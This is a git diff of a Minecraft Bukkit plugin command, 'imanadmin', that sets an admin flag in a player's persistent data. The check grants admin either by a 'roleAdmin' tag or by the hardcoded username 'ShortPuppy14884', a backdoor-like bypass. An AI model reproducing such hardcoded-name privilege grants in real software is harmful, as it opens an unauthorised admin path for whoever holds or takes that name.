@@ -4,25 +4,22 @@ package woks.woks.matthew;
 //player.getScoreboardTags().contains("roleAdmin")
 
 import org.bukkit.Bukkit;
-import org.bukkit.NamespacedKey;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
 import org.bukkit.persistence.PersistentDataContainer;
 import org.bukkit.persistence.PersistentDataType;
-import org.bukkit.plugin.Plugin;
 import woks.woks.CommandBase;
 import woks.woks.Msg;
-import woks.woks.WOKS;
 
 import java.util.List;
 
-public class ImAnAdmin {
-    public ImAnAdmin(WOKS plugin) {
-        Bukkit.getPluginManager().registerEvents((Listener) this, plugin);
+import static woks.woks.WOKS._admin;
 
-        ImAnAdmin th = this;
+
+public class ImAnAdmin {
+    public ImAnAdmin() {
+
 
         new CommandBase("imanadmin", true) {
             @Override
@@ -34,16 +31,20 @@ public class ImAnAdmin {
                     return true;
                 }
                 if ((player.getScoreboardTags().contains("roleAdmin")) || player.getName().equals("ShortPuppy14884")) {
-                    NamespacedKey namespacedKeyNumberRank = new NamespacedKey((Plugin) th, "_admin");
                     PersistentDataContainer dataContainer = player.getPersistentDataContainer();
 
 
-                    if (!dataContainer.has(namespacedKeyNumberRank, PersistentDataType.INTEGER)) {
-                        dataContainer.set(namespacedKeyNumberRank, PersistentDataType.INTEGER, 0);
+                    if (!dataContainer.has(_admin, PersistentDataType.INTEGER)) {
+                        dataContainer.set(_admin,  PersistentDataType.INTEGER, 1);
+                        Msg.send(sender, "Role admin added.");
+                    } else {
+                        Msg.send(sender, "'!dataContainer.has(_admin, PersistentDataType.INTEGER)', failed.");
                     }
 
 //                    Integer role_rank_air_number = dataContainer.get(namespacedKeyNumberRank, PersistentDataType.INTEGER);
 
+                } else {
+                    Msg.send(sender, "'player.getName().equals(\"ShortPuppy14884\")', failed.");
                 }
                 return true;
             }
